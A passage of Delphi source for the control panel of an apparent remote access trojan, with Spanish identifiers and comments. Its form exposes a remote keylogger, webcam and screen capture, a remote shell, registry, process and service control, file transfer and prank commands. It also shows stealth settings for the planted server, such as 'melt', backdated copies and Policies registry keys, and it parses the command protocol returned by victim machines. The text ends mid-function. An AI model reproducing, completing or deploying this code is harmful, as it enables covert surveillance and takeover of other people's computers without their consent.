unit UnitFormControl;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, CommCtrl,
  Dialogs, ComCtrls, XPMan, ImgList, Menus, ExtCtrls, StdCtrls, Buttons, ScktComp, Jpeg,
  UnitVariables, Spin, IdThreadMgr, IdThreadMgrDefault, IdAntiFreezeBase,
  IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer, UnitTransfer,
   UnitFormReg, ScreenMaxCap, UnitFormSendKeys, UnitFunciones, Shfolder,ShellAPI;

type
  TFormControl = class(TForm)
    PageControl: TPageControl;
    TabInfo: TTabSheet;
    BtnRefrescarInformacion: TSpeedButton;
    TabProcesos: TTabSheet;
    BtnRefrescarProcesos: TSpeedButton;
    ListViewProcesos: TListView;
    TabVentanas: TTabSheet;
    BtnRefrescarVentanas: TSpeedButton;
    ListViewVentanas: TListView;
    TabBromas: TTabSheet;
    BtnEnviarBromas: TSpeedButton;
    ListViewBromas: TListView;
    TabFileManager: TTabSheet;
    LabelPathArchivos: TLabel;
    LabelNumeroDeArchivos: TLabel;
    LabelNumeroDeCarpetas: TLabel;
    BtnActualizarArchivos: TSpeedButton;
    BtnVerUnidades: TSpeedButton;
    cmbUnidades: TComboBox;
    ListViewArchivos: TListView;
    EditPathArchivos: TEdit;
    TabRegistro: TTabSheet;
    BtnVerRegisto: TSpeedButton;
    EditPathRegistro: TEdit;
    Mensajes: TTabSheet;
    MemoMensaje: TMemo;
    TabScreencap: TTabSheet;
    DlgGuardar: TSaveDialog;
    PopupProcess: TPopupMenu;
    Cerrar1: TMenuItem;
    PopupWindows: TPopupMenu;
    Cerrar2: TMenuItem;
    Maximizar1: TMenuItem;
    Minimizar1: TMenuItem;
    Mostrar1: TMenuItem;
    Ocultar1: TMenuItem;
    Minimizartodas1: TMenuItem;
    BotnCerrarX1: TMenuItem;
    Activar1: TMenuItem;
    Desactivar1: TMenuItem;
    PopupFileManager: TPopupMenu;
    EjecutarAbrir1: TMenuItem;
    Normal1: TMenuItem;
    Oculto1: TMenuItem;
    Eliminar: TMenuItem;
    Cambiarnombre1: TMenuItem;
    Crearnuevacarpeta1: TMenuItem;
    PopupRegistro: TPopupMenu;
    Nuevo1:  TMenuItem;
    Clave1:  TMenuItem;
    N2:      TMenuItem;
    Valoralfanumrico1: TMenuItem;
    Valorbinerio1: TMenuItem;
    valorDWORD1: TMenuItem;
    Valordecadenamltiple1: TMenuItem;
    N3:      TMenuItem;
    N1:      TMenuItem;
    Eliminar1: TMenuItem;
    XPManifest: TXPManifest;
    StatusBar: TStatusBar;
    BtnEnviarMensaje: TSpeedButton;
    Enviarteclas1: TMenuItem;
    TabWebcam: TTabSheet;
    TabServidor: TTabSheet;
    ListViewServidor: TListView;
    BtnActualizarServidorInfo: TSpeedButton;
    TimerCaptureScreen: TTimer;
    Descargarfichero1: TMenuItem;
    N4:      TMenuItem;
    TabTransferencias: TTabSheet;
    ListViewDescargas: TListView;
    Label1:  TLabel;
    PopupDescargas: TPopupMenu;
    Subir1:  TMenuItem;
    Bajar1:  TMenuItem;
    Subiralprimerpuesto1: TMenuItem;
    ltimopuesto1: TMenuItem;
    Borrarcompletados1: TMenuItem;
    Eliminardescarga1: TMenuItem;
    Subirfichero1: TMenuItem;
    OpenDialogUpload: TOpenDialog;
    TabShell: TTabSheet;
    MemoShell: TMemo;
    PopupShell: TPopupMenu;
    Activar2: TMenuItem;
    ComboBoxShellCommand: TComboBox;
    DlgFont: TFontDialog;
    BtnCambiarFuenteShell: TSpeedButton;
    BtnCambiarColorShell: TSpeedButton;
    DlgColors: TColorDialog;
    Desactivar2: TMenuItem;
    N5:      TMenuItem;
    Guardarcmo1: TMenuItem;
    TabServicios: TTabSheet;
    ListViewServicios: TListView;
    BtnServicios: TSpeedButton;
    PopupServicios: TPopupMenu;
    Iniciar1: TMenuItem;
    DEtener1: TMenuItem;
    Desinstalar1: TMenuItem;
    Instalar1: TMenuItem;
    MultiEditInstalarServicio: TEdit;
    btnSiguienteInstalarServicio: TSpeedButton;
    BtnCancelarInstalarServicio: TSpeedButton;
    btnInstServicios: TSpeedButton;
    btnInstServicios2: TSpeedButton;
    DetenerDescarga1: TMenuItem;
    ReanudarDescarga1: TMenuItem;
    Agregaracoladedescarga1: TMenuItem;
    ComboBoxGestionDeServidor: TComboBox;
    BtnEnviarComandoServidor: TSpeedButton;
    ListViewInformacion: TListView;
    btnGuardarImagen: TSpeedButton;
    LabelPosicionCompresJpg: TLabel;
    LabelCalidadCapScreen: TLabel;
    BtnCapturarScreen: TSpeedButton;
    BtnVerGrandeCap: TSpeedButton;
    ProgressBarScreen: TProgressBar;
    TrackBarCalidad: TTrackBar;
    CheckBoxMouseClicks: TCheckBox;
    ScrollBoxCapScreenM: TScrollBox;
    imgCaptura: TImage;
    CheckBoxAutoCapturaScreen: TCheckBox;
    SpinCaptureScreen: TSpinEdit;
    ProgressBarWebcam: TProgressBar;
    ImgWebcam: TImage;
    ComboBoxWebcam: TComboBox;
    TrackBarCalidadWebcam: TTrackBar;
    LabelPosicionCompresJpgWebcam: TLabel;
    LabelCalidadWebcam: TLabel;
    BtnCapturarWebcam: TSpeedButton;
    BtnGuardarWebcam: TSpeedButton;
    BtnObtenerWebcams: TSpeedButton;
    LabelMensaje: TLabel;
    LabelTituloMensaje: TLabel;
    EditTituloMensaje: TEdit;
    GrpBoxTipoMensaje: TGroupBox;
    ImgError: TImage;
    ImgAsterisk: TImage;
    ImgWarning: TImage;
    ImgInfo: TImage;
    RdBtnError: TRadioButton;
    RdBtnPregunta: TRadioButton;
    RdBtnExclamacion: TRadioButton;
    RdBtnInfo: TRadioButton;
    RdBtnVacio: TRadioButton;
    RdGrpBotonesMensaje: TRadioGroup;
    N6:      TMenuItem;
    N7:      TMenuItem;
    Iralproceso1: TMenuItem;
    Previsualizarjpg1: TMenuItem;
    TimerCamCapture: TTimer;
    CheckBoxAutoCamCapture: TCheckBox;
    SpinCam: TSpinEdit;
    CheckBoxMostrarVentanasOcultas: TCheckBox;
    PopupGuardarPantallaoWebcam: TPopupMenu;
    Guardarimagen1: TMenuItem;
    Guardadoautomtico1: TMenuItem;
    TabKeylogger: TTabSheet;
    RichEditKeylogger: TRichEdit;
    IconsArchivos: TImageList;
    SpeedButtonRecibirLog: TSpeedButton;
    SpeedButtonEliminarLog: TSpeedButton;
    SpeedButtonGuardarLog: TSpeedButton;
    SpeedButtonActivarKeylogger: TSpeedButton;
    EditLogName: TEdit;
    ProgressBarKeylogger: TProgressBar;
    N9: TMenuItem;
    Abrircarpetadescargas1: TMenuItem;
    CheckBoxOnlineKeylogger: TCheckBox;
    PrevisualizarImagenes1: TMenuItem;
    CheckBoxTamanioReal: TCheckBox;
    Panel1: TPanel;
    TreeViewRegedit: TTreeView;
    ListViewRegistro: TListView;
    Splitter1: TSplitter;
    Portapapeles1: TMenuItem;
    Copiar1: TMenuItem;
    Pegar1: TMenuItem;
    ScrollBoxCapWebcam: TScrollBox;
    procedure FormCreate(Sender: TObject);
    procedure BtnRefrescarProcesosClick(Sender: TObject);
    procedure BtnRefrescarVentanasClick(Sender: TObject);
    procedure cmbUnidadesSelect(Sender: TObject);
    procedure ListViewArchivosDblClick(Sender: TObject);
    procedure Cerrar1Click(Sender: TObject);
    procedure Cerrar2Click(Sender: TObject);
    procedure Maximizar1Click(Sender: TObject);
    procedure Minimizar1Click(Sender: TObject);
    procedure Mostrar1Click(Sender: TObject);
    procedure Ocultar1Click(Sender: TObject);
    procedure Minimizartodas1Click(Sender: TObject);
    procedure Normal1Click(Sender: TObject);
    procedure Oculto1Click(Sender: TObject);
    procedure EliminarClick(Sender: TObject);
    procedure Cambiarnombre1Click(Sender: TObject);
    procedure Crearnuevacarpeta1Click(Sender: TObject);
    procedure BtnRefrescarInformacionClick(Sender: TObject);
    procedure BtnActualizarArchivosClick(Sender: TObject);
    procedure BtnEnviarBromasClick(Sender: TObject);
    procedure BtnVerUnidadesClick(Sender: TObject);
    procedure TreeViewRegeditDblClick(Sender: TObject);
    procedure TreeViewRegeditChange(Sender: TObject; Node: TTreeNode);
    procedure BtnVerRegistoClick(Sender: TObject);
    procedure N1Click(Sender: TObject);
    procedure ListViewRegistroEdited(Sender: TObject; Item: TListItem;
      var S: string);
    procedure Eliminar1Click(Sender: TObject);
    procedure Valoralfanumrico1Click(Sender: TObject);
    procedure TreeViewRegeditContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: boolean);
    procedure ListViewRegistroContextPopup(Sender: TObject;
      MousePos: TPoint; var Handled: boolean);
    procedure Clave1Click(Sender: TObject);
    procedure ListViewArchivosContextPopup(Sender: TObject;
      MousePos: TPoint; var Handled: boolean);
    procedure ListViewArchivosEdited(Sender: TObject; Item: TListItem;
      var S: string);
    procedure Valorbinerio1Click(Sender: TObject);
    procedure valorDWORD1Click(Sender: TObject);
    procedure Valordecadenamltiple1Click(Sender: TObject);
    procedure BtnEnviarMensajeClick(Sender: TObject);
    procedure Activar1Click(Sender: TObject);
    procedure Desactivar1Click(Sender: TObject);
    procedure TrackBarCalidadChange(Sender: TObject);
    procedure BtnCapturarScreen1Click(Sender: TObject);
    procedure Enviarteclas1Click(Sender: TObject);
    procedure TrackBarCalidadWebcamChange(Sender: TObject);
    procedure BtnObtenerWebcamsClick(Sender: TObject);
    procedure BtnCapturarWebcamClick(Sender: TObject);
    procedure EnviarClickM(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: integer);
    procedure BtnActualizarServidorInfoClick(Sender: TObject);
    procedure BtnEnviarComandoServidorClick(Sender: TObject);
    procedure BtnVerGrandeCapClick(Sender: TObject);
    procedure TimerCaptureScreenTimer(Sender: TObject);
    procedure Descargarfichero1Click(Sender: TObject);
    procedure Borrarcompletados1Click(Sender: TObject);
    procedure ListViewDescargasContextPopup(Sender: TObject;
      MousePos: TPoint; var Handled: boolean);
    procedure ListViewDescargasCustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: integer; State: TCustomDrawState;
      var DefaultDraw: boolean);
    procedure Eliminardescarga1Click(Sender: TObject);
    procedure Subiralprimerpuesto1Click(Sender: TObject);
    procedure Subir1Click(Sender: TObject);
    procedure Bajar1Click(Sender: TObject);
    procedure ltimopuesto1Click(Sender: TObject);
    procedure Subirfichero1Click(Sender: TObject);
    procedure Activar2Click(Sender: TObject);
    procedure ComboBoxShellCommandKeyPress(Sender: TObject; var Key: char);
    procedure BtnCambiarFuenteShellClick(Sender: TObject);
    procedure BtnCambiarColorShellClick(Sender: TObject);
    procedure PopupShellPopup(Sender: TObject);
    procedure Desactivar2Click(Sender: TObject);
    procedure Guardarcmo1Click(Sender: TObject);
    procedure BtnServiciosClick(Sender: TObject);
    procedure DEtener1Click(Sender: TObject);
    procedure Iniciar1Click(Sender: TObject);
    procedure Desinstalar1Click(Sender: TObject);
    procedure Instalar1Click(Sender: TObject);
    procedure BtnCancelarInstalarServicioClick(Sender: TObject);
    procedure btnSiguienteInstalarServicioClick(Sender: TObject);
    procedure btnInstServiciosClick(Sender: TObject);
    procedure btnInstServicios2Click(Sender: TObject);
    procedure PopupDescargasPopup(Sender: TObject);
    procedure DetenerDescarga1Click(Sender: TObject);
    procedure ReanudarDescarga1Click(Sender: TObject);
    procedure ObteneryAniadirKeyloggerLog(AThread: TIdPeerThread; filesize: int64);
    function  ObtenerScreenCap_CamCap(AThread: TIdPeerThread; filesize: int64;var MS:Tmemorystream):string;
    procedure Agregaracoladedescarga1Click(Sender: TObject);
    procedure EditPathArchivosKeyPress(Sender: TObject; var Key: char);
    procedure ListViewProcesosColumnClick(Sender: TObject; Column: TListColumn);
    procedure ListViewProcesosCompare(Sender: TObject; Item1, Item2: TListItem;
      Data: integer; var Compare: integer);
    procedure ListViewRegistroCompare(Sender: TObject; Item1, Item2: TListItem;
      Data: integer; var Compare: integer);
    procedure ListViewArchivosCompare(Sender: TObject; Item1, Item2: TListItem;
      Data: integer; var Compare: integer);
    procedure Iralproceso1Click(Sender: TObject);
    procedure SpinCaptureScreenChange(Sender: TObject);
    procedure CheckBoxAutoCapturaScreenClick(Sender: TObject);
    procedure Previsualizarjpg1Click(Sender: TObject);
    procedure SpinCamChange(Sender: TObject);
    procedure CheckBoxAutoCamCaptureClick(Sender: TObject);
    procedure TimerCamCaptureTimer(Sender: TObject);
    procedure CheckBoxMostrarVentanasOcultasClick(Sender: TObject);
    procedure Guardarimagen1Click(Sender: TObject);
    procedure btnGuardarImagenClick(Sender: TObject);
    procedure PopupGuardarPantallaoWebcamPopup(Sender: TObject);
    procedure Guardadoautomtico1Click(Sender: TObject);
    procedure TabKeyloggerShow(Sender: TObject);
    procedure SpeedButtonRecibirLogClick(Sender: TObject);
    procedure SpeedButtonActivarKeyloggerClick(Sender: TObject);
    procedure SpeedButtonEliminarLogClick(Sender: TObject);
    procedure CheckBoxOnlineKeyloggerClick(Sender: TObject);
    procedure SpeedButtonGuardarLogClick(Sender: TObject);
    procedure TabServidorShow(Sender: TObject);
    procedure TabInfoShow(Sender: TObject);
    procedure TabProcesosShow(Sender: TObject);
    procedure TabVentanasShow(Sender: TObject);
    procedure TabServiciosShow(Sender: TObject);
    procedure TabFileManagerShow(Sender: TObject);
    procedure TabScreencapShow(Sender: TObject);
    procedure TabWebcamShow(Sender: TObject);
    procedure FormCanResize(Sender: TObject; var NewWidth,
      NewHeight: Integer; var Resize: Boolean);
    procedure CheckBoxTamanioRealClick(Sender: TObject);
    procedure PrevisualizarImagenes1Click(Sender: TObject);
    procedure Copiar1Click(Sender: TObject);
    procedure Pegar1Click(Sender: TObject);
  private  //Funciones y variables privadas que solo podemos usar en este Form
    Servidor: TIdPeerThread;
    //Variables para recibir ficheros
    FormVisorDeMiniaturas: TObject;
    mslistviewitem : Tlistitem;
    RecibiendoFichero: boolean;
    NombreSI, DescripcionSI, RutaSI: string; //EnviarInstalarservicios
    Columna, ColumnaOrdenada: integer;
    PrefijoGuardarCaptura, PrefijoGuardarWebcam : string; //Para el guardado automático
    InumeroCaptura, InumeroWebcam : integer;
    AnchuraPantalla, AlturaPantalla : integer; //Altura y anchura de la pantalla del servidor
    AnchuraWebCam, AlturaWebCam : integer; //Altura y anchura de la WebCam del servidor
    PrevisualizacionActiva : boolean; //Activada o desactivada la previsualización
    PortaPapeles : string;
    function ObtenerRutaAbsolutaDeArbol(Nodo: TTreeNode): string;
    function IconNum(strExt: string): integer;
    procedure AniadirClavesARegistro(Claves: string);
    procedure AniadirValoresARegistro(Valores: string);
    procedure UpdateProgressBarScreen;
    procedure TransferFinishedNotification(Sender: TObject);
    procedure agregardescarga(filename:string);
    procedure agregardescargaencola(filename:string;tamano:integer);
  public  //Funciones públicas que podemos llamar desde otros Forms
    NombrePC: string; //Nombre del PC remoto
    RecibiendoJPG : boolean; //Recibiendo captura? o camara o thumbnail  (se usa desde UnitVisorDeMiniaturas)
    constructor Create(aOwner: TComponent; AThread: TIdPeerThread); overload;
    procedure OnRead(command: string; AThread: TIdPeerThread); overload;
    procedure OnReadFile(AThread: TIdPeerThread); overload;
    procedure CrearDirectoriosUsuario();  //Es llamada tambien desde el visor de Thumbnails
    procedure pedirJPG(tipo:integer;info:string);//0=pantalla 1=webcam 2=thumnails info=thumbnailpath
    //procedure show(AThread: TIdPeerThread);overload;
   end;

var
  FormControl: TFormControl;
  pctProgressBarScreen: integer;
  GenericBar:  TProgressBar;

implementation

uses UnitMain, UnitOpciones, UnitVisorDeMiniaturas;
{$R *.dfm}


constructor TFormControl.Create(aOwner: TComponent; AThread: TIdPeerThread);
begin
  inherited Create(aOwner);
  Servidor := AThread;
  FormVisorDeMiniaturas := nil;
end;

procedure TFormControl.FormCreate(Sender: TObject);
var
  vFileInfo: TSHFileInfo;
  vImgList : THandle;
  Function FileIconInit(FullInit: BOOL): BOOL; stdcall;
type
TFileIconInit = function(FullInit: BOOL): BOOL; stdcall;
var
ShellDLL: HMODULE;
PFileIconInit: TFileIconInit;
begin
Result := False;
if (Win32Platform = VER_PLATFORM_WIN32_NT) then
begin
ShellDLL := LoadLibrary(PChar('shell32.dll'));
PFileIconInit := GetProcAddress(ShellDLL, PChar(660));
if (Assigned(PFileIconInit)) then
Result := PFileIconInit(FullInit);
end;
end;
begin
  RecibiendoFichero := False;
 { self.Constraints.MinHeight := 383;
  self.Constraints.MinWidth := 569;  }

{  TabBromas.Caption := '';
  TabFileManager.Caption := '';
  TabInfo.Caption := '';
  TabKeylogger.Caption := '';
  TabProcesos.Caption := '';
  TabRegistro.Caption := '';
  TabScreencap.Caption := '';
  TabServicios.Caption := '';
  TabServidor.Caption := '';
  TabShell.Caption := '';
  TabTransferencias.Caption := '';
  TabVentanas.Caption := '';
  TabWebcam.Caption := '';
  TabMensajes.Caption := ''; }
  FileIconInit(true);
  vImgList := SHGetFileInfo(PChar(''),
                    FILE_ATTRIBUTE_NORMAL,
                    vFileInfo,
                    SizeOf(vFileInfo),
                   SHGFI_ICON or SHGFI_SMALLICON or
                    SHGFI_SYSICONINDEX {or SHGFI_USEFILEATTRIBUTES    }
                    );

  SendMessage(listviewarchivos.Handle, LVM_SETIMAGELIST, LVSIL_SMALL , vImgList);

  DestroyIcon(vFileInfo.hIcon);
  
  vImgList := SHGetFileInfo(PChar(''),
                    FILE_ATTRIBUTE_NORMAL,
                    vFileInfo,
                    SizeOf(vFileInfo),
                    SHGFI_ICON or
                    SHGFI_SYSICONINDEX {or SHGFI_USEFILEATTRIBUTES    }
                    );

  SendMessage(listviewarchivos.Handle, LVM_SETIMAGELIST, LVSIL_NORMAL , vImgList);

  DestroyIcon(vFileInfo.hIcon);
end;

procedure TFormControl.OnRead(command: string; AThread: TIdPeerThread);
var
  Recibido, TempStr: string;
  Item:     TListItem;
  i, a:     integer;
  RealSize: string;
begin
  Recibido := Command;

  //FormMain.Caption := Recibido; //Para debuggear!
  {if Recibido = 'CONNECTED?' then
    Exit;
  if Pos('CONNECTED?', Recibido) > 0 then
    Delete(Recibido, Pos('CONNECTED?', Recibido), Length('CONNECTED?')); //Borra la String 'CONNECTED?'}

  if Copy(Recibido, 1, 4) = 'PING' then
  begin
    Servidor.Connection.Writeln('PONG');
  end;

  if Copy(Recibido, 1, 4) = 'INFO' then
  begin
    Delete(Recibido, 1, 5); //Borramos INFO|
    for i := 0 to 9 do  //10 items
    begin
      if i = 9 then  //Tamaño de los discos duros recibido en bytes
        ListViewInformacion.Items[i].SubItems[0] :=
          ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, Pos('|', Recibido) - 1)))
      else
        ListViewInformacion.Items[i].SubItems[0] :=
          Copy(Recibido, 1, Pos('|', Recibido) - 1);
      Delete(Recibido, 1, Pos('|', Recibido));
    end;
    BtnRefrescarInformacion.Enabled := true;
  end;

  //Comandos relacionados con la gestión del servidor
  if Copy(Recibido, 1, 8) = 'SERVIDOR' then
  begin
    Delete(Recibido, 1, 9);
    TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Saca el comando
    Delete(Recibido, 1, Pos('|', Recibido));
    //Información específica del servidor
    if TempStr = 'INFO' then
    begin
      with ListViewServidor do
      begin
        //Versión
        Items[0].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
        Delete(Recibido, 1, Pos('|', Recibido));
        //Nombre
        Items[1].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
        Delete(Recibido, 1, Pos('|', Recibido));

        Items[3].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
        Delete(Recibido, 1, Pos('|', Recibido));

        for i := 5 to 9 do
        begin
          //bCopiar, NombreDeArchivo, Copiar a, melt, CopiarConFechaAnterior
          Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
          Delete(Recibido, 1, Pos('|', Recibido));
        end;
        for i := 11 to 12 do
        begin
          //bPolicies, Nombre de la clave de Policies
          Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
          Delete(Recibido, 1, Pos('|', Recibido));
        end;
        for i := 14 to 15 do
        begin
          //bPolicies, Nombre de la clave de Policies
          Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
          Delete(Recibido, 1, Pos('|', Recibido));
        end;

        //Ruta del servidor
        Items[17].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
        Delete(Recibido, 1, Pos('|', Recibido));
      end;
      BtnActualizarServidorInfo.enabled := true;
    end;
  end;

  //Listar Procesos
  if Copy(Recibido, 1, 4) = 'PROC' then
  begin
    ListViewProcesos.Clear;
    Delete(Recibido, 1, 5);
    while pos('|', Recibido) > 0 do
    begin
      Item := ListViewProcesos.Items.Add;
      Item.ImageIndex := 3; //imagen para que quede bonito XD
      Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
      Delete(Recibido, 1, Pos('|', Recibido));
      Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
      Delete(Recibido, 1, Pos('|', Recibido));
      TempStr := Copy(recibido, 1, Pos('|', Recibido) - 1);
      //De la ruta de los procesos quitamos \??\ y sustituimos \SystemRoot\ por %windir%\
      TempStr := StringReplace(TempStr, '\??\', '', [rfReplaceAll]);
      if Copy(TempStr, 1, 12) = '\SystemRoot\' then
        TempStr := StringReplace(TempStr, '\SystemRoot\', '%windir%\', [rfReplaceAll]);
      Item.SubItems.Add(TempStr);
      Delete(Recibido, 1, Pos('|', Recibido));
    end;
    BtnRefrescarProcesos.Enabled := true;
  end;

  //Listar Ventanas
  if Copy(Recibido, 1, 4) = 'WIND' then
  begin
    ListViewVentanas.Clear;
    Delete(Recibido, 1, 5);
    while pos('|', Recibido) > 0 do
    begin
      Item := ListViewVentanas.Items.Add;
      Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);        //titulo
      Delete(Recibido, 1, Pos('|', Recibido));
      Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));     //handle
      Delete(Recibido, 1, Pos('|', Recibido));
      case strtoint(Copy(Recibido, 1, Pos('|', Recibido) - 1)) of
      0: begin item.ImageIndex := 65; Item.SubItems.Add('Oculta'); end;
      1: begin item.ImageIndex := 61; Item.SubItems.Add('Maximizada'); end;
      2: begin item.ImageIndex := 66; Item.SubItems.Add('Normal'); end;
      3: begin item.ImageIndex := 64; Item.SubItems.Add('Minimizada'); end;
      end;
      Delete(Recibido, 1, Pos('|', Recibido));
    end;
     BtnRefrescarVentanas.Enabled := true;
  end;

  //Ir a proceso...
  //Sintaxis: WINPROC|HandleDeLaVentana|PIDDelProcesoDueñoDeLaVentana
  if Copy(Recibido, 1, 7) = 'WINPROC' then
  begin
    Delete(Recibido, 1, 8);
    //Mete en TempStr la handle
    TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
    Delete(Recibido, 1, Pos('|', Recibido));
    if ListViewProcesos.Items.Count <= 0 then
      MessageBox(Handle,
        'No se encontró ningún proceso listado. Debes actualizar la lista de procesos.',
        'Error', MB_ICONERROR + MB_OK);
    if Recibido = '0' then
    begin
      MessageBox(Handle,
        'No se encontró ningún proceso para la ventana. Es posible que el proceso ya haya sido cerrado.'
        +
        #13#10 + 'Actualice la lista de ventanas.', 'Error', MB_ICONERROR + MB_OK);
    end
    else
      for i := 0 to ListViewProcesos.Items.Count - 1 do
      begin
        if ListViewProcesos.Items[i].SubItems[0] = Recibido then
        begin
          StatusBar.Panels[1].Text :=
            'La ventana con handle ' + TempStr + ' pertenece al proceso "' +
            ListViewProcesos.Items[i].Caption + '" con PID ' + Recibido + '.';
          ListViewProcesos.Items[i].MakeVisible({PartialVisible->}False);
          //Falso para asegurarse que se vea completamente el item
          PageControl.ActivePageIndex := TabProcesos.TabIndex;
          ListViewProcesos.SetFocus;
          ListViewProcesos.Items[i].Focused  := True;
          ListViewProcesos.Items[i].Selected := True;
          //Para que aparezca automaticamente seleccionado en la ventana
           Break;
        end;
      end;
  end;

  //Mostrar Mensaje en la StatusBar
  if Copy(Recibido, 1, 3) = 'MSG' then
  begin
    Delete(Recibido, 1, 4);
    if Recibido = 'El directorio no existe!' then
    begin
      EditPathArchivos.Text :=
        Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
      EditPathArchivos.Text :=
        Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
    end;
    StatusBar.Panels[1].Text := Recibido;
    MessageBeep($FFFFFFFF);
    //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
  end;

  if Copy(Recibido, 1, 15) = 'MOUSETEMBLOROSO' then
  begin
    Delete(Recibido, 1, 16); //Borra 'MOUSETEMBLOROSO|' de la string
    ListViewBromas.Items[0].SubItems[0] := Recibido;
    //0 porque es el primero en la ListViewBromas
  end;
  if Copy(Recibido, 1, 13) = 'CONGELARMOUSE' then
  begin
    Delete(Recibido, 1, 14); //Borra 'CONGELARMOUSE|' de la string
    ListViewBromas.Items[1].SubItems[0] := Recibido;
  end;
  if Copy(Recibido, 1, 7) = 'ABRIRCD' then
  begin
    Delete(Recibido, 1, 8); //Borra ''ABRIRCD|' de la string
    ListViewBromas.Items[2].SubItems[0] := Recibido;
  end;
  if Copy(Recibido, 1, 16) = 'MATARBOTONINICIO' then
  begin
    Delete(Recibido, 1, 17); //Borra 'MATARBOTONINICIO|' de la string
    ListViewBromas.Items[3].SubItems[0] := Recibido;
  end;

  if Copy(Recibido, 1, 11) = 'VERUNIDADES' then
  begin
    Delete(Recibido, 1, 12); //Borra 'VERUNIDADES|' de la string
    cmbUnidades.Items.Clear;
    while Pos('|', Recibido) > 1 do
      //Mayor que 1 porque hay un '|' al final de la cadena que se desprecia
    begin
      TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));  //Unidad
      Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
      TempStr := TempStr + ' ' + Copy(Recibido, 1, (Pos('|', Recibido) - 1));  //Nombre
      Delete(Recibido, 1, Pos('|', Recibido));

      TempStr := TempStr + ' - Espacio libre/total: ' +
        ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, (Pos('|', Recibido) - 1))));
      //Espacio disponible
      Delete(Recibido, 1, Pos('|', Recibido));
      TempStr := TempStr + ' / ' +
        ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, (Pos('|', Recibido) - 1))));
      //Espacio total
      Delete(Recibido, 1, Pos('|', Recibido));
      TempStr := TempStr + ' - Formato: ' + Copy(Recibido, 1, (Pos('|', Recibido) - 1));
      //Formato
      Delete(Recibido, 1, Pos('|', Recibido));
      case StrToInt(Copy(Recibido, 1, (Pos('|', Recibido) - 1))) of //el último caracter
        0: TempStr := TempStr + ' - Unidad desconocida';
        2: TempStr := TempStr + ' - Unidad removible';
        3: TempStr := TempStr + ' - Disco duro';
        4: TempStr := TempStr + ' - Disco de red';
        5: TempStr := TempStr + ' - Unidad de CD/DVD';
        6: TempStr := TempStr + ' - Disc RAM';
      end;
      cmbUnidades.Items.Add(TempStr);
      Delete(Recibido, 1, Pos('|', Recibido));
    end;
    cmbUnidades.Enabled      := True;
    EditPathArchivos.Enabled := True;
    BtnActualizarArchivos.Enabled := True;
    StatusBar.Panels[1].Text := 'Unidades listadas.';
    BtnVerUnidades.Enabled := True;
  end;

  if Copy(Recibido, 1, 14) = 'LISTARARCHIVOS' then
  begin
    Delete(Recibido, 1, 15); //Borra 'LISTARARCHIVOS|'

    if Pos('|', Recibido) > 1 then
    begin
      TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
      //Saca la longitud de la cadena
      Delete(Recibido, 1, Pos('|', Recibido)); //Borra la longitud
    end;
    while Length(Recibido) < StrToInt(TempStr) do
      //mientras el length de la cadena sea menor a lo que nos dice el server
      Recibido := Recibido + Trim(Athread.Connection.ReadLn);
      ListViewArchivos.Items.BeginUpdate;
      ListViewArchivos.Clear; //Limpia primero...
    if Length(EditPathArchivos.Text) > 3 then
    begin
      Item := ListViewArchivos.Items.Add;
      Item.ImageIndex := 3;
      Item.Caption := '<..>';
    end;
    
    while Pos('|', Recibido) > 1 do
    begin
      TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
      Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
      if TempStr[1] = #2 then //entonces le llegó una carpeta
      begin
        Delete(TempStr, 1, 1); //borra el #2
        Item := ListViewArchivos.Items.Add;
        Item.ImageIndex := 3; //1 es el icono de carpeta cerrada
        Item.Caption := Copy(TempStr, 1, Pos(':', TempStr) - 1);
        Item.SubItems.Add('');
        Item.SubItems.Add('Carpeta de archivos');
        Item.SubItems.Add(Copy(TempStr, Pos(':', TempStr) + 1, Length(TempStr)));
      end
      else //entonces es un archivo, saque tambien la información extra...
      begin
        Item    := ListViewArchivos.Items.Add;
        Item.ImageIndex := IconNum(LowerCase(ExtractFileExt(TempStr)));
        Item.Caption := TempStr;
        TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
        Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
        Item.SubItems.Add(ObtenerMejorUnidad(StrToInt(TempStr)));
        RealSize := TempStr;
        TempStr  := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
        Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
        Item.SubItems.Add(TempStr); //agrega el tipo
        TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
        Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
        Item.SubItems.Add(TempStr); //agrega la fecha
        Item.SubItems.Add(RealSize);
      end;
    end;
    if ListViewArchivos.Items.Count > 0 then
    begin
      //Aquí cuenta las carpetas para decir cuantas son
      a := 0;
